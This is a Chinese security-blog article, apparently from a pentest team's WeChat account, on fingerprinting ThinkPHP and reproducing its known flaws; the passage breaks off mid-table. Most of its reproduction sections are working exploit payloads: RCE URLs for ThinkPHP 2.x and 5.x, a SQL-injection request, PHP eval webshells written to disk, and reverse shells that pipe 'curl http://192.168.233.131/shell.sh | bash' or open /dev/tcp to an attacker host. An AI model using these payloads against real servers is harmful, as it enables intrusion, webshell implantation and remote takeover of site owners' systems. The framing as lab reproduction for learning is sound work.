#  掌握thinkphp全漏洞(超详细看完拿捏tp)文末带工具 | 干货   
 渗透安全团队   2023-11-25 10:10  
  
**文章目录**  
<table><tbody style="outline: 0px;visibility: visible;"><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">框架介绍<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">何为thinkphp,在哪会遇到<span style="letter-spacing: 0.578px;text-wrap: wrap;">thinkphp</span></td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">识别spring<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">如何在实战中快速分辨<span style="letter-spacing: 0.578px;text-wrap: wrap;">thinkphp</span>框架<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">漏洞列表<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">thinkphp</span>漏洞全版本<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">漏洞环境搭建<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">vulhub+vulfocus(见上一篇spring)<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">漏洞复现<br style="outline: 0px;visibility: visible;"/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">1.如何识别当前站点是否存在漏洞</td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">2.哪些版本(情况)存在该漏洞<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">3.漏洞指纹特征⭐<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">4.如何复现<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">5.如何实现自动化<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">工具<br style="outline: 0px;"/></td><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);">1.指纹识别工具<br style="outline: 0px;"/></td></tr><tr style="outline: 0px;"><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);"><br/></td><td valign="top" colspan="1" rowspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);"><p style="outline: 0px;">2.综合利用工具</p></td></tr></tbody></table>  
**零-thinkphp的前世今生**  
  
ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。  
  
　　ThinkPHP可以支持windows/Unix/Linux等服务器环境，正式版需要PHP5.0以上版本支持，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展，ThinkPHP框架本身没有什么特别模块要求，具体的应用系统运行环境要求视开发所涉及的模块。  
  
　　作为一个整体开发解决方案，ThinkPHP能够解决应用开发中的大多数需要，因为其自身包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件，并且对于跨版本、跨平台和跨数据库移植都比较方便。并且每个组件都是精心设计和完善的，应用开发过程仅仅需要关注业务逻辑。  
  
**总结一下:**  
国人开发的框架,上手简单,开发成本低,搭建容易  
  
所以,tp框架常见于一些违法网站上面  
  
tp版本信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOnpOvuM6gEZPQHlWzvMjvFdRwbyjRUCUUshjkLOH9PzP6wWnzibZdXag/640?wx_fmt=png "")  
  
文档中心 · ThinkPHP    这是tp的官方文档,包含了框架一些基本知识,一些必要的知识我会在复现过程中一一讲解,不过还是建议自己去看一下文档  
  
**一-识别tp框架(指纹)**  
  
1.1 ioc判断  
  
/favicon.ico  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOlBozc7FI10qknBONibo52JVicLibnsicMhM27zZTVEksEhLk8CSpUFTALw/640?wx_fmt=png "")  
  
1.2  
报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOlnvzgJrNB2RP93CXdaRzia5Jbj6RPgoxVdJCwv0iaYWzibCxFzia6hrJjw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOcbphsY7k80N1PO9m7xY6ZnjFDmQhsTOgGTWmGKkyJ3BlPkgm5wRaeQ/640?wx_fmt=png "")  
  
1.3错误传参  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCO0soH2SJLpyiaicM4J6c7wzibOlAOiaAtkPK0EklBZOygahlWmNTq1Kw4tg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eC30YNehkkDzkdlOEnwHBzvAY13vToIAoI9nDSWibruicjVlN71Lvx8Cg/640?wx_fmt=png "")  
  
1.4特殊指纹出现logo  
  
/?c=4e5e5d7364f443e28fbf0d3ae744a59a  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOv5JNOVclfibrrDSEdZIJK3ElotnxXsJheibbge3XjhJbPibV8l1ibiaPicwg/640?wx_fmt=png "")  
  
/4e5e5d7364f443e28fbf0d3ae744a59a  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOhkbJ2iaY5Pl3P3hWu66cFsquRmcJm4ljYv20ZZ9d5cfgu536ooBEzmA/640?wx_fmt=png "")  
  
p3.1和3.2版本  
  
4e5e5d7364f443e28fbf0d3ae744a59a-index.html  
  
1.5 body特征  
  
body里有"十年磨一剑" 或者"ThinkPHP"  
  
1.6插件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up6TPpuCn3NNwS5LDO7MqCOe0Sxjic5PPD1P6u2lCMicfWVZ6pFcEC73lZ0eVWibNiaeia0nvFTx0xHqYw/640?wx_fmt=png "")  
  
**二-漏洞列表**  
<table><tbody><tr><td width="269" valign="top" style="word-break: break-all;"><h1 style="letter-spacing: 0.578px;text-wrap: wrap;">ThinkPHP 2.x 任意代码执行漏洞</h1></td></tr><tr><td width="269" valign="top" style="word-break: break-all;"><h2>ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞(5-rce)</h2></td></tr><tr><td width="269" valign="top" style="word-break: break-all;"><h2>ThinkPHP5 SQL注入漏洞 &amp; 敏感信息泄露</h2></td></tr><tr><td width="269" valign="top" style="word-break: break-all;"><h2>ThinkPHP 5.0.23 远程代码执行漏洞</h2></td></tr><tr><td width="269" valign="top" style="word-break: break-all;">ThinkPHP3.2.x RCE</td></tr><tr><td width="269" valign="top" style="word-break: break-all;">thinkphp lang 命令执行</td></tr></tbody></table>  
# ThinkPHP 2.x 任意代码执行漏洞  
#   
  
  
**1 漏洞原理**  
  
ThinkPHP 2.x版本中，使用  
preg_replace的  
/e模式匹配路由：  
```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```  
  
导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。  
  
ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。  
  
什么是  
preg_replace 函数  
  
这个函数是个替换函数，而且支持正则，使用方式如下：  
```
```  
```
preg_replace('正则规则','替换字符','目标字符')
```  
```
```  
```
```  
  
这个函数的3个参数，结合起来的意思是：如果目标字符存在符合正则规则的字符，那么就替换为替换字符，如果此时正则规则中使用了/e  
这个修饰符，则存在代码执行漏洞。  
  
下面是搜索到的关于/e  
的解释：  
```
```  
```
```  
```
```  
  
只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。  
  
**2 影响版本**  
  
2.x  
  
3.0  
  
**3.复现**  
  
触发条件是php<=5.6.29  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0c5rk9cwswuYC3GLiaxQtP1NjfaAeQuHcaQ5nJtSzJKQvicudrU7wuNIQ/640?wx_fmt=png "")  
  
访问  
/index.php?s=/index/index/name/$%7B@phpinfo()%7D  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0wjD7icDBuzFXGwj9Lmjg366Kdpa9BatNTmdc3xKibaRfgK4XYuPMVJQQ/640?wx_fmt=png "")  
# 之间改成$%7Bsystem(whoami)%7D  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0AIhI7EtMEybM7gh2wpBYNQAdh9EYt2XyahFgicIUdhiafyG0Ikbp2r1A/640?wx_fmt=png "")  
#   
# 一句话  
  
$  
{     
@  
print  
(  
eval  
(  
$_POST  
[  
1  
]))}  
  
反弹shell  
  
先在攻击机写一个sh文件,里面放  
  
bash -i >& /dev/tcp/192.168.233.131/7777 0>&1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0G5YGic6QWQb0gtktWUPrlRNd5awRSF5QQGZccYtF5HaR9yFjnSHEB4A/640?wx_fmt=png "")  
  
攻击机开启web服务  
  
python -m SimpleHTTPServer 80  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0aNicfVqv7JPoib4qbzhHibFRXzcXKpAx95DoZ0bBdEPSHviaRRIyq755zA/640?wx_fmt=png "")  
  
然后用马子去执行这个sh文件的命令  
  
1=system("curl http://192.168.233.131/shell.sh  | bash");  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0DIbexObSXCFDRRznShVn3zHQwa1ErMsG8VwIbwUMv244q38gTMgdmg/640?wx_fmt=png "")  
  
亦或者直接马子执行反弹shell命令  
```
1=system%28%22bash+-c+'bash+-i+>%26+%2Fdev%2Ftcp%2F192.168.233.131%2F8888+0>%261'%22%29%3B
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0DXt6R1KHM5iaN5tYwe5iaps6ose9ibFJRQWZIrCKvYaIqK8C47Hm2ntfg/640?wx_fmt=png "")  
  
ok结束,docker-compose down下一关  
  
对了,这里我想和小白说几句话,漏洞复现确实是一个很枯燥的过程,但是只有复现完理解完才能有可能掌握这些漏洞,才能有可能在实战中认出这个洞,必不可少的一个过程,麋鹿希望读者能静下心来,去按照我们的文章一个一个复现一边,最后自己也写一个过程当作笔记,收集一个指纹表做为自己的参考.正如麋鹿主页说所,  
不管是对于高考这些应试考试,还是学习技术,学习本就是一场修行,就是用来炼心的,用来克服懒惰和心猿意马的.  
  
## ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞(5-rce)  
##   
  
  
**1 漏洞原理**  
  
由于框架错误地处理了控制器名称，因此如果网站未启用强制路由（默认设置），则该框架可以执行任何方法，从而导致RCE漏洞。  
  
**2 影响版本**  
  
5.0.22/5.1.29  
  
**3 复现**  
  
触发地址是  
```
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=+url编码后的马子
```  
  
对   
<?php phpinfo(); eval(@$_POST['cmd']); ?>进行编码然后拼接  
```
http://192.168.233.131:8080/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=milu.php&vars[1][]=%3C%3Fphp%20phpinfo()%3B%20eval(%40%24_POST[%27cmd%27])%3B%20%3F%3E
```  
  
‍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0RfR2MI8MX5ibcBBxfRjZOlH1eDWT4qbjABva57jTZH43F6hq5sCW5ZQ/640?wx_fmt=png "")  
  
访问milu.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0cPtIzQ1iaYo84o9bzws5icviaoCkVBgX2FyfFY9EoFOhlXfkPMZqydt5w/640?wx_fmt=png "")  
  
后面反弹shell这些和前面一样![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0YVibgxwxV6avOcfN5WOJGcKPNyt2GYIdczWDDSM1TaJBSibOZTKILtcg/640?wx_fmt=png "")  
  
## ThinkPHP5 SQL注入漏洞 & 敏感信息泄露  
  
****# 1 漏洞原理  
  
  
传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。  
  
这里具体讲一下漏洞产生的过程吧  
  
漏洞附近代码如下  
```
<?php
namespace app\index\controller;

use app\index\model\User;

class Index
{
    public function index()
{
        $ids = input('ids/a');
        $t = new User();
        $result = $t->where('id', 'in', $ids)->select();
    }
}
```  
  
这里如果in可控的话，通过用户传入，那么就会造成注入，让我们来分析一下in的操作代码：  
```
<?php
...
$bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
if (preg_match('/\W/', $bindName)) {
    // 处理带非单词字符的字段名
    $bindName = md5($bindName);
}
...
} elseif (in_array($exp, ['NOT IN', 'IN'])) {
    // IN 查询
    if ($value instanceof \Closure) {
        $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
    } else {
        $value = is_array($value) ? $value : explode(',', $value);
        if (array_key_exists($field, $binds)) {
            $bind  = [];
            $array = [];
            foreach ($value as $k => $v) {
                if ($this->query->isBind($bindName . '_in_' . $k)) {
                    $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                } else {
                    $bindKey = $bindName . '_in_' . $k;
                }
                $bind[$bindKey] = [$v, $bindType];
                $array[]        = ':' . $bindKey;
            }
            $this->query->bind($bind);
            $zone = implode(',', $array);
        } else {
            $zone = implode(',', $this->parseValue($value, $field));
        }
        $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
    }

```  
  
代码先对  
$bindName  
 先进行了一次检测，防止了一些注入情况，但是我们看到$value是一个数组的情况下，会遍历  
$value  
，并将  
$k  
拼接进  
$bingName  
。  
  
介绍一下PDO预编译的过程  
  
1. prepare($SQL) 编译SQL语句  
  
2. bindValue($param, $value) 将value绑定到param的位置上  
  
3. execute() 执行  
  
这个漏洞实际上就是控制了第二步的$param变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的,返回执行的恶意语句结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eGQCpceYUyibgAd5RQoDsxDBKYsklyWZ88BzhdrvUibheDWub0DmsVaTg/640?wx_fmt=png "")  
  
**2 影响版本**  
  
ThinkPHP < 5.1.23  
  
**3 复现**  
  
这里环境要用到80端口,记得关了之前的web环境(反弹shell时)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoKDn47vnMSPA4lc6HHaGf0ic541AZWwTorfrw4e1pE4OqwUaSL4avy8qVicuqglM3h7G5EQHibugK1w/640?wx_fmt=png "")  
  
访问  
/index.php?ids[]=1&ids[]=2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3epiaKApLtoogCRTzgCec10sichQotu6TTe6FAUwgtricSjyKgRSkVM6n6g/640?wx_fmt=png "")  
  
/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eGQCpceYUyibgAd5RQoDsxDBKYsklyWZ88BzhdrvUibheDWub0DmsVaTg/640?wx_fmt=png "")  
  
  
**ThinkPHP 5.0.23 远程代码执行漏洞**  
  
# 1 漏洞原理  
  
其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。  
  
**2 版本**  
  
ThinkPHP 5.0.x < 5.0.23 ThinkPHP 5.1.x < 5.1.31  
  
**3 复现**  
```
t&server[REQUEST_METHOD]=whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3e4W9jRHwAoYPe67d8DW0wzeC1jyWjxEjdojMdIn2mXKRkNg6zibWfMJg/640?wx_fmt=png "")  
# 写shell  
  
先pwd一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3emAvuq2DdEW8Q9Yp2GZ6bqicqDmYbxn3US35RtLxncDaqibMN6cvQ8viaQ/640?wx_fmt=png "")  
  
ok知道了,就写  
/var/www/public/这里  
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo <?php @eval($_POST['milu']); ?>  >>/var/www/public/milu.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3exGkASGDhfJDeomFiaZfbqTO7Eg7nZSsnmEwwCGLazxtdy15AkzibfblA/640?wx_fmt=png "")  
# 如果写入失败,base64一下  
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echoIDw/cGhwIEBldmFsKCRfUE9TVFsnbWlsdSddKTsgPz4= >>/var/www/public/hushell.php
```  
  
蚁🗡连接就行了,密码是milu  
# 反弹shell  
# 开启web  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eacxicMyJ1TFib7pRndSS8liaqOOib0F4I8OkxDLSKEIGnhlIjuk6jiaLiaBA/640?wx_fmt=png "")  
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl http://192.168.233.131/shell.sh | bash
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eEGRXWTVxI5HZPl9biap4c3ia1n5zvyPNdjAXUzFchDqIgiaGLrt50rDmg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eWc2WsFkOALIiaLq6YXkvwxdpjexiaR9cLliat3CP6SHrIK1cXjW2faWPA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uribSwIWP3w8uLzee8xc9v3eXAonsZVIKPzko5nkCNouHr186mPh3nqZib2o73RZLxibvdHOmgUdEibKA/640?wx_fmt=png "")  
##   
## 上面有个5rce,现在是5.0.23,可能有读者不懂了,麋鹿来解释一下  
## tp 5版本rce有两个版本  
  
ThinkPHP 5.0-5.0.24和ThinkPHP 5.1.0-5.1.30  
  
漏洞触发点和版本的不同，所以payload也不一样,条件也不一样  
  
<table><thead><tr><th style="padding: 8px 14px;background-color: rgb(250, 250, 250);border-top-width: 1px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">版本名</th><th style="padding: 8px 14px;background-color: rgb(250, 250, 250);border-top-width: 1px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是否可被攻击</th><th style="padding: 8px 14px;background-color: rgb(250, 250, 250);border-top-width: 1px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;word-break: break-all;"><p><span style="font-size: var(--articleFontsize);letter-spacing: 0.034em;">攻击条件</span><br/></p></th></tr></thead><tbody><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.0</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.1</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.2</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.3</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.4</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.5</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.6</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.7</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.8</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.9</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.10</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.11</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.12</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.13</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.14</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.15</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.16</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.17</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.18</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.19</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.20</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">否</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">无</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">5.0.21</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">是</td><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 50px;">需开启debug</td></tr><tr><td style="padding: 8px 14px;border-color: rgb(192, 192, 192);border-collapse: collapse;min-width: 